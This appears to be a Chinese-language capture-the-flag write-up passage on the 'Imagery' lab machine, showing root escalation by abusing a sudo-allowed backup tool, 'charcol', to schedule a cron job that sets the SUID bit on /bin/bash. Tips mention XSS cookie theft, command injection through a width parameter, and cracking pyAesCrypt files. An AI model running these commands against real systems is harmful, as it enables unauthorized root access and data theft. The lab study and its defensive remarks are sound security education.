权限提升 sudo charcol 恶意 Cron 任务

检查 sudo 权限

mark@Imagery:~$ sudo -l
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol

Charcol 是一个 CLI 备份工具，支持创建加密备份、下载文件，以及通过 auto add 管理 cron 定时任务。

初始化 Charcol

# 先重置密码到默认
sudo /usr/local/bin/charcol -R

# 进入交互 shell，设置应用密码
sudo /usr/local/bin/charcol shell
# 设置密码（如 123）和 master passphrase（如 123）

创建恶意 Cron 任务

Charcol 的 auto add 功能可以创建 cron 任务，且不验证命令内容的安全性。由于 sudo charcol 以 root 运行，创建的 cron 任务也以 root 权限执行：

sudo /usr/local/bin/charcol shell
# 输入 master passphrase

charcol> auto add --schedule "* * * * *" --command "/bin/bash -c 'chmod u+s /bin/bash'" --name "pwn"
# 输入应用密码确认
[INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true /bin/bash -c 'chmod u+s /bin/bash'
🧒 儿童版：Charcol 是一个备份工具，它有"定时任务"功能，可以设置每隔一段时间自动运行命令。管理员给了 mark sudo charcol 的权限，本意是让他做自动备份。但 Charcol 不检查命令内容是否安全——我们写了一条"给 /bin/bash 加 SUID 权限"的命令，设为每分钟执行一次。root 就乖乖帮我们做了。

⚠️ 踩坑提醒

XSS 窃取 Cookie 需要攻击机开 HTTP 服务器接收，Base64 解码后是完整的 Flask session

Transform Image 的命令注入在 width 参数中，需要用分号 ; 截断

pyAesCrypt 加密文件的暴力破解需要专用工具 dpyAesCrypt.py，普通的 john/hashcat 不支持

Charcol 的 auto add 需要先设置应用密码和 master passphrase，否则无法使用

* * * * * 表示每分钟执行一次，最多等 60 秒

额外知识

Flask Session 安全

Flask 的默认 session 实现是客户端 session——数据存储在 Cookie 中，经过 Base64 编码 + HMAC 签名。签名使用 SECRET_KEY，防止篡改但不加密（内容可被读取）。如果 SECRET_KEY 泄露或可被暴力破解（使用 flask-unsign 工具），攻击者可以伪造任意 session 内容（如 isAdmin: true）。

pyAesCrypt 加密格式

pyAesCrypt 使用 AES-256-CBC 加密，密钥由用户密码通过 PBKDF2 派生。文件头包含版本标识（AES），与标准的 OpenSSL 加密格式不同。破解需要专用工具而非通用的 john/hashcat。弱密码（如本靶机的 bestfriends）在 rockyou 字典中很快就能找到。

Sudo 备份工具提权模式

本靶机的 Charcol 提权与之前遇到的 Composer（Academy）、bbot（Cypher）属于同一类型：管理员授予 sudo 权限的工具允许执行任意命令或加载用户可控代码。防御方式是遵循最小权限原则——不给备份工具完整的 sudo 权限，而是用专用的 systemd timer 或受限的 cron 配置。
